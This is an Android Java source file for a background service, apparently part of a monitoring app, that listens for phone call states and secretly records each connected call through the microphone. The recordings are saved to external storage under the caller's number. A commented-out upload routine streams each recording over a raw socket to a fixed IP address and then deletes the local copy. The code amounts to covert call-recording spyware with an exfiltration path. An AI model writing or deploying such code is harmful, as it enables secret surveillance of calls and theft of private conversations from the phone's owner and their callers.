package com.imageviewdimen.touchspring.monitor.Service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;

/**
 * Created by KIM on 2015/6/25 0025.
 */
public class PhoneService   extends Service{
    private SimpleDateFormat dateFormat;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i("KIMOPL", "PhoneService onCreate");
        dateFormat = new SimpleDateFormat("yyyyMMdd-HH:mm:ss");
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
    }

    private final class PhoneListener extends PhoneStateListener {
        private String incomingNumber;
        private File file;
        private MediaRecorder mediaRecorder;

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING://来电

                        this.incomingNumber = incomingNumber;
                        Log.i("KIMOPL","CALL_STATE_RINGING :" + incomingNumber);
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK://接通电话
                        Log.i("KIMOPL","CALL_STATE_OFFHOOK");
                        file = new File(Environment.getExternalStorageDirectory(), this.incomingNumber + ".3gp");
                        mediaRecorder = new MediaRecorder();
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        mediaRecorder.setOutputFile(file.getAbsolutePath());
                        Log.i("KIMOPL", "file:" + file.getAbsolutePath());
                        mediaRecorder.prepare();
                        mediaRecorder.start();//开始录音
                        break;

                    case TelephonyManager.CALL_STATE_IDLE://挂断电话后回归到空闲状态
                        Log.i("KIMOPL","CALL_STATE_IDLE");
                        if (mediaRecorder != null) {
                            mediaRecorder.stop();
                            mediaRecorder.release();
                            mediaRecorder = null;

                            // uploadFile();
                        }
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }



        /*private  void uploadFile() {
            new Thread(new Runnable() {
                public void run() {
                    try {
                        if(file!=null && file.exists()){
                            Socket socket = new Socket("192.168.1.100", 7878);
                            OutputStream outStream = socket.getOutputStream();
                            String head = "Content-Length="+ file.length() + ";filename="+ file.getName() + ";sourceid=\r\n";
                            outStream.write(head.getBytes());

                            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());
                            String response = StreamTool.readLine(inStream);
                            String[] items = response.split(";");
                            String position = items[1].substring(items[1].indexOf("=")+1);

                            RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
                            fileOutStream.seek(Integer.valueOf(position));
                            byte[] buffer = new byte[1024];
                            int len = -1;
                            while( (len = fileOutStream.read(buffer)) != -1){
                                outStream.write(buffer, 0, len);
                            }
                            fileOutStream.close();
                            outStream.close();
                            inStream.close();
                            socket.close();
                            file.delete();
                            file = null;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }*/
    }


}
